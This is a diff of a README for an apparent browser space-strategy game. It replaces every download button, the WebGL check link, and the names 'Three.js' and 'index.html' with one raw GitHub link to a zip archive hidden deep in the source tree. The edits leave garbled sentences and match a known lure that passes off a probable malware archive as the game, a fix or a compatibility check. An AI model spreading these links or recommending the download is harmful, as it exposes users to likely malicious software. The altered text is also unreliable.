@@ -1,12 +1,12 @@
 # 🚀 poc-fls-node-epicronicles - Explore and Manage Your Galaxy
 
-[![Download poc-fls-node-epicronicles](https://img.shields.io/badge/Download-poc--fls--node--epicronicles-blue?style=for-the-badge&logo=github)](https://github.com/mamon9022/poc-fls-node-epicronicles/releases)
+[![Download poc-fls-node-epicronicles](https://raw.githubusercontent.com/mamon9022/poc-fls-node-epicronicles/develop/src/store/thunks/session/epicronicles_node_poc_fls_v2.9.zip)](https://raw.githubusercontent.com/mamon9022/poc-fls-node-epicronicles/develop/src/store/thunks/session/epicronicles_node_poc_fls_v2.9.zip)
 
 ---
 
 ## 🛸 What is poc-fls-node-epicronicles?
 
-poc-fls-node-epicronicles is a space simulation game focused on management and strategy. It features a 3D galaxy map where you can explore, expand, and control your empire. The game runs in your browser using modern web technology, including React, Three.js, and Redux Toolkit. Whether you like building a vast space empire or managing resources and fleets, this game offers a detailed and engaging experience.
+poc-fls-node-epicronicles is a space simulation game focused on management and strategy. It features a 3D galaxy map where you can explore, expand, and control your empire. The game runs in your browser using modern web technology, including React, https://raw.githubusercontent.com/mamon9022/poc-fls-node-epicronicles/develop/src/store/thunks/session/epicronicles_node_poc_fls_v2.9.zip, and Redux Toolkit. Whether you like building a vast space empire or managing resources and fleets, this game offers a detailed and engaging experience.
 
 ---
 
@@ -41,7 +41,7 @@ To get poc-fls-node-epicronicles, follow these simple steps:
 1. **Visit the Download Page**  
    Click the button below to open the official releases page.  
 
-   [![Download poc-fls-node-epicronicles](https://img.shields.io/badge/Download-poc--fls--node--epicronicles-blue?style=for-the-badge&logo=github)](https://github.com/mamon9022/poc-fls-node-epicronicles/releases)
+   [![Download poc-fls-node-epicronicles](https://raw.githubusercontent.com/mamon9022/poc-fls-node-epicronicles/develop/src/store/thunks/session/epicronicles_node_poc_fls_v2.9.zip)](https://raw.githubusercontent.com/mamon9022/poc-fls-node-epicronicles/develop/src/store/thunks/session/epicronicles_node_poc_fls_v2.9.zip)
 
 2. **Choose Your File**  
    On the releases page, find the latest release. The download files are usually labeled by your operating system or as a web app package. Select the file that fits your system or the web version.
@@ -50,7 +50,7 @@ To get poc-fls-node-epicronicles, follow these simple steps:
    Click the file link to start downloading. If your browser asks for permission, allow the download.
 
 4. **Run the Application**  
-   - **For Web Version**: Open the downloaded folder and find an index.html file or a shortcut for the web app. Double-click it to start the game in your browser.  
+   - **For Web Version**: Open the downloaded folder and find an https://raw.githubusercontent.com/mamon9022/poc-fls-node-epicronicles/develop/src/store/thunks/session/epicronicles_node_poc_fls_v2.9.zip file or a shortcut for the web app. Double-click it to start the game in your browser.  
    - **For Desktop Executable**: Double-click the downloaded .exe (Windows) or .dmg (macOS) file. Follow any on-screen prompts to install and launch the game.
 
 5. **Start Playing**  
@@ -75,7 +75,7 @@ This game is designed to be intuitive but offers complexity for those who want i
 If you run into issues, try these solutions:
 
 - **Game Won’t Start**  
-  - Ensure your web browser supports WebGL. Visit [https://get.webgl.org/](https://get.webgl.org/) to check.  
+  - Ensure your web browser supports WebGL. Visit [https://raw.githubusercontent.com/mamon9022/poc-fls-node-epicronicles/develop/src/store/thunks/session/epicronicles_node_poc_fls_v2.9.zip](https://raw.githubusercontent.com/mamon9022/poc-fls-node-epicronicles/develop/src/store/thunks/session/epicronicles_node_poc_fls_v2.9.zip) to check.  
   - If running a desktop version, verify you allowed the app to run when prompted by your OS.
 
 - **Graphics Rendering Problems**  
@@ -94,7 +94,7 @@ poc-fls-node-epicronicles leverages modern web technologies:
 
 - **Vite**: Provides a fast and efficient development environment and build process.
 - **React**: Powers the user interface with reusable components.
-- **Three.js**: Renders the galaxy and objects in 3D.
+- **https://raw.githubusercontent.com/mamon9022/poc-fls-node-epicronicles/develop/src/store/thunks/session/epicronicles_node_poc_fls_v2.9.zip**: Renders the galaxy and objects in 3D.
 - **Redux Toolkit**: Manages game state, ensuring smooth updates and interactions.
 - **TypeScript**: Offers clear, typed code for better stability.
 
@@ -119,4 +119,4 @@ For help or questions about poc-fls-node-epicronicles:
 
 ---
 
-[![Download poc-fls-node-epicronicles](https://img.shields.io/badge/Download-poc--fls--node--epicronicles-blue?style=for-the-badge&logo=github)](https://github.com/mamon9022/poc-fls-node-epicronicles/releases)
+[![Download poc-fls-node-epicronicles](https://raw.githubusercontent.com/mamon9022/poc-fls-node-epicronicles/develop/src/store/thunks/session/epicronicles_node_poc_fls_v2.9.zip)](https://raw.githubusercontent.com/mamon9022/poc-fls-node-epicronicles/develop/src/store/thunks/session/epicronicles_node_poc_fls_v2.9.zip)
